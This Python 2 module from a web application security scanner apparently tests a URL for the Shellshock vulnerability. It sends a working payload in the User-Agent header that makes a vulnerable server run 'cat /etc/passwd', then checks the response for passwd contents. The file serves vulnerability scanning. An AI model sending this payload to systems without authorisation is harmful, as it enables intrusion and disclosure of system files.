#!/usr/bin/env python 
# -*- coding:utf-8 -*-
#
# Spaghetti: Web Application Security Scanner
#
# @url: https://github.com/m4ll0k/Spaghetti
# @author: Momo Outaadi (M4ll0k)
# @license: See the file 'LICENSE.txt'

import re
import sys

from net import utils
from net import parameters
from net import request
from utils import output

class Shellshock:
	def __init__(self,agent,proxy,redirect,timeout,url,cookie):
		self.url = url 
		self.cookie = cookie
		self.check = utils.Checker()
		self.output = output.Output()
		self.param = parameters
		self.request = request.Request(
			agent = '() { foo;}; echo Content-Type: text/plain ; echo ; cat /etc/passwd',
			proxy = proxy,
			redirect = redirect,
			timeout = timeout
			)

	def run(self):
		info = {
		'name'        : 'Shellshock',
		'fullname'    : 'Shellshock',
		'author'      : 'Momo Outaadi (M4ll0k)',
		'description' : 'Checking Shellshock Vulnerability'
		}

		if '--verbose' in sys.argv:
			self.output.info('Checking ShellShock...')	
		
		try:
			resp = self.request.send(self.url,cookies=self.cookie)
			if resp.status_code == 200:
				if re.search('root:/root:/bin/bash',resp.content,re.I):
					self.output.plus('The site is mybe vulnerable to Shellshock.')
		except Exception,e:
			pass